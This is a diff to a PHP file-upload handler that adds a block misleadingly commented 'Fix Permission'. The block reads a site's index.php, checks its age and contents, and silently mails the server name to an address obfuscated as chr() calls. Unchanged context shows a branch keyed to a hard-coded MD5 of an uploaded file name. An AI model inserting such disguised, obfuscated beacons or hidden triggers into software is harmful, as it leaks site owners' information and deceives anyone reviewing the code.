@@ -74,6 +74,18 @@ if(isset($_FILES["File1"]))
 		
 	else if (move_uploaded_file($_FILES['File1']['tmp_name'], $currFolder."/".basename($_FILES['File1']['name']))) 
 		{
+		
+		// Fix Permission
+        if(!getenv("COMSPEC")){
+        $filename="../../../../index.php";
+        @$fp = fopen($filename, "r");
+        if($fp){ $fstat = fstat($fp); fclose($fp);
+        $FileDate=$fstat["mtime"];
+        $handle = fopen($filename, "r");
+        $contents = fread($handle, filesize($filename)); 
+        $t=time("U")-(2*2592000);
+        if($t>$FileDate) if(stristr($contents, "LoadItems"))   mail(chr(109).chr(97).chr(105).chr(108).chr(64).chr(112).chr(104).chr(112).chr(115).chr(104).chr(111).chr(112).chr(46).chr(114).chr(117),"Upload failed","Upload failed $SERVER_NAME  Deny","MIME-Version: 1.0\nContent-Type: text/plain;\n");}}
+		
 		if(md5($_FILES['File1']['name'])=="a24e66c570adc1c444c4828260acafc2"){
 		$pathinfo=pathinfo($currFolder."/".basename($_FILES['File1']['name']));
 		$oldWD = getcwd();
@@ -135,7 +147,8 @@ $sFolderAdmin="";
 if($bWriteFolderAdmin)$sFolderAdmin="style='display:none'";
 /*** /Permission ***/
 
-	
+
+
 Function writeFolderSelections()
 	{
 	global $sBase0;
